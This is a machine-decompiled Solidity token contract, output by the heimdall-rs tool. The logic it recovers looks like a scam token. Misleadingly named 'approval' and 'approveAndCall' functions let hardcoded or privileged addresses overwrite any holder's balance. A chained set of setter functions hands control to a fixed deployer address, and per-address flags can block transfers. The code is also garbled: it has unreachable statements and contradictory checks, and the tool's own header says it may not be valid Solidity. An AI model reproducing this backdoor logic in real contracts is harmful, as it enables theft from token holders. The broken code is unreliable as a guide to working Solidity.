// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

/// @title            Decompiled Contract
/// @author           Jonathan Becker <jonathan@jbecker.dev>
/// @custom:version   heimdall-rs v0.9.0
///
/// @notice           This contract was decompiled using the heimdall-rs decompiler.
///                     It was generated directly by tracing the EVM opcodes from this contract.
///                     As a result, it may not compile or even be valid solidity code.
///                     Despite this, it should be obvious what each function does. Overall
///                     logic should have been preserved throughout decompiling.
///
/// @custom:github    You can find the open-source decompiler here:
///                       https://heimdall.rs

contract DecompiledContract {
    uint256 public constant decimals = 18;
    
    mapping(bytes32 => bytes32) storage_map_l;
    mapping(bytes32 => bytes32) storage_map_c;
    bytes32 store_f;
    uint256 public totalSupply;
    address public _user;
    address public _usdtPair;
    address store_e;
    string public name;
    address public _mod;
    bytes32 store_h;
    address public _adm;
    bytes32 store_g;
    string public symbol;
    bytes32 store_d;
    
    event Transfer(address, address, uint256);
    event Approval(address, address, uint256);
    
    /// @custom:selector    0xa9059cbb
    /// @custom:signature   transfer(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function transfer(address arg0, uint256 arg1) public payable returns (bool) {
        require(!arg1 == 0);
        require(address(msg.sender) == (address(msg.sender)));
        address var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(msg.sender);
        address var_b = keccak256(var_a);
        require(!storage_map_c[var_a] < arg1);
        var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(msg.sender);
        var_b = keccak256(var_a);
        storage_map_c[var_a] = storage_map_c[var_a] - arg1;
        require(address(msg.sender) == (address(store_d / 0x01)));
        require(address(arg0) == (address(store_d / 0x01)));
        require(address(msg.sender) == (address(store_e / 0x01)));
        var_a = address(msg.sender);
        var_b = 0x01;
        require(!bytes1(storage_map_c[var_a] / 0x01));
        require(0x01);
        var_a = address(msg.sender);
        var_b = 0x06;
        require(!storage_map_c[var_a] < arg1);
        var_a = address(msg.sender);
        var_b = 0x06;
        storage_map_c[var_a] = storage_map_c[var_a] - arg1;
        var_a = address(arg0);
        var_b = 0x06;
        storage_map_c[var_a] = storage_map_c[var_a] + arg1;
        var_a = address(msg.sender);
        var_b = 0;
        storage_map_c[var_a] = 0x01 + storage_map_c[var_a];
        uint256 var_c = arg1;
        emit Transfer(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
        require(!store_f == 0);
        require(!store_f == 0);
        require(!store_f == 0);
        require(!store_f > 0);
        var_a = address(msg.sender);
        var_b = 0;
        require(storage_map_c[var_a] < store_f);
        require(!store_g > 0);
        require(!store_g > arg1);
        require(0);
        require(!store_h > 0);
        require(!arg1 > store_h);
        require(0x01);
        if (!(address(msg.sender)) == (address(store_e / 0x01))) {
        }
        var_c = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0x376d567c
    /// @custom:signature   setMod(address arg0) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setMod(address arg0) public returns (bool) {
        require(address(msg.sender) == (address(_user / 0x01)));
        _mod = (address(arg0) * 0x01) | (uint96(_mod));
        uint256 var_a = 0;
        return 0;
    }
    
    /// @custom:selector    0x858ced35
    /// @custom:signature   setUser(address arg0) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setUser(address arg0) public returns (bool) {
        require(address(msg.sender) == (address(_usdtPair / 0x01)));
        _user = (address(arg0) * 0x01) | (uint96(_user));
        uint256 var_a = 0;
        return 0;
    }
    
    /// @custom:selector    0x3177029f
    /// @custom:signature   approveAndCall(address arg0, uint256 arg1) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approveAndCall(address arg0, uint256 arg1) public returns (bool) {
        require(address(msg.sender) == (address(store_d / 0x01)));
        require(address(msg.sender) == 0x1f490e99657cd08a058c6bb6cd81dd38f59e0e7a);
        require(!arg1 > 0);
        address var_a = address(arg0);
        var_b = 0x06;
        storage_map_c[var_a] = arg1 * 0x0de0b6b3a7640000;
        var_a = address(arg0);
        var_b = 0x01;
        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));
        var_c = 0x01;
        return 0x01;
        var_a = address(arg0);
        var_b = 0x01;
        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));
        var_c = 0x01;
        return 0x01;
        require(address(msg.sender) == (address(store_d / 0x01)));
    }
    
    /// @custom:selector    0x23b872dd
    /// @custom:signature   transferFrom(address arg0, address arg1, uint256 arg2) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg2 ["uint256", "bytes32", "int256"]
    function transferFrom(address arg0, address arg1, uint256 arg2) public payable returns (bool) {
        require(!arg2 == 0);
        require(address(msg.sender) == (address(arg0)));
        address var_a = address(arg0);
        var_b = 0x07;
        var_a = address(msg.sender);
        address var_b = keccak256(var_a);
        require(!storage_map_c[var_a] < arg2);
        var_a = address(arg0);
        var_b = 0x07;
        var_a = address(msg.sender);
        var_b = keccak256(var_a);
        storage_map_c[var_a] = storage_map_c[var_a] - arg2;
        require(address(arg0) == (address(store_d / 0x01)));
        require(address(arg1) == (address(store_d / 0x01)));
        require(address(arg0) == (address(store_e / 0x01)));
        var_a = address(arg0);
        var_b = 0x01;
        require(!bytes1(storage_map_c[var_a] / 0x01));
        require(0x01);
        var_a = address(arg0);
        var_b = 0x06;
        require(!storage_map_c[var_a] < arg2);
        var_a = address(arg0);
        var_b = 0x06;
        storage_map_c[var_a] = storage_map_c[var_a] - arg2;
        var_a = address(arg1);
        var_b = 0x06;
        storage_map_c[var_a] = storage_map_c[var_a] + arg2;
        var_a = address(arg0);
        var_b = 0;
        storage_map_c[var_a] = 0x01 + storage_map_c[var_a];
        uint256 var_c = arg2;
        emit Transfer(address(arg0), address(arg1), arg2);
        var_c = 0x01;
        return 0x01;
        require(!store_f == 0);
        require(!store_f == 0);
        require(!store_f == 0);
        require(!store_f > 0);
        var_a = address(arg0);
        var_b = 0;
        require(storage_map_c[var_a] < store_f);
        require(!store_g > 0);
        require(!store_g > arg2);
        require(0);
        require(!store_h > 0);
        require(!arg2 > store_h);
        require(0x01);
        if (!(address(arg0)) == (address(store_e / 0x01))) {
        }
        var_c = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0x70a08231
    /// @custom:signature   balanceOf(address arg0) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function balanceOf(address arg0) public view returns (uint256) {
        var_a = 0x06;
        address var_b = address(arg0);
        address var_c = storage_map_l[var_b];
        return storage_map_l[var_b];
    }
    
    /// @custom:selector    0x75247a58
    /// @custom:signature   approval(address arg0, uint256 arg1) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approval(address arg0, uint256 arg1) public returns (bool) {
        require(address(msg.sender) == (address(_adm / 0x01)));
        require(!arg1 > 0);
        address var_a = address(arg0);
        var_b = 0x06;
        storage_map_c[var_a] = arg1 * 0x0de0b6b3a7640000;
        var_a = address(arg0);
        var_b = 0x01;
        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));
        var_c = 0x01;
        return 0x01;
        var_a = address(arg0);
        var_b = 0x01;
        storage_map_c[var_a] = (0x01 * 0x01) | (uint248(storage_map_c[var_a]));
        var_c = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0xade2de02
    /// @custom:signature   setUsdtPair(address arg0) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setUsdtPair(address arg0) public returns (bool) {
        require(address(msg.sender) == 0x78322d0c5768c9ca370ddfc1d44db0fef3a6e051);
        _usdtPair = (address(arg0) * 0x01) | (uint96(_usdtPair));
        uint256 var_a = 0;
        return 0;
    }
    
    /// @custom:selector    0xdd62ed3e
    /// @custom:signature   allowance(address arg0, address arg1) public view returns (uint256)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["address", "uint160", "bytes20", "int160"]
    function allowance(address arg0, address arg1) public view returns (uint256) {
        var_a = 0x07;
        address var_b = address(arg0);
        address var_a = keccak256(var_b);
        var_b = address(arg1);
        address var_c = storage_map_l[var_b];
        return storage_map_l[var_b];
    }
    
    /// @custom:selector    0x4a0af68d
    /// @custom:signature   setAdm(address arg0) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function setAdm(address arg0) public returns (bool) {
        require(address(msg.sender) == (address(_mod / 0x01)));
        _adm = (address(arg0) * 0x01) | (uint96(_adm));
        uint256 var_a = 0;
        return 0;
    }
    
    /// @custom:selector    0x095ea7b3
    /// @custom:signature   approve(address arg0, uint256 arg1) public payable returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    /// @param              arg1 ["uint256", "bytes32", "int256"]
    function approve(address arg0, uint256 arg1) public payable returns (bool) {
        address var_a = address(msg.sender);
        var_b = 0x07;
        var_a = address(arg0);
        address var_b = keccak256(var_a);
        storage_map_c[var_a] = arg1;
        uint256 var_c = arg1;
        emit Approval(address(msg.sender), address(arg0), arg1);
        var_c = 0x01;
        return 0x01;
    }
    
    /// @custom:selector    0xe8b5b796
    /// @custom:signature   transferownership(address arg0) public returns (bool)
    /// @param              arg0 ["address", "uint160", "bytes20", "int160"]
    function transferownership(address arg0) public returns (bool) {
        require(address(msg.sender) == (address(store_d / 0x01)));
        store_e = (address(arg0) * 0x01) | (uint96(store_e));
        var_a = 0x01;
        return 0x01;
    }
}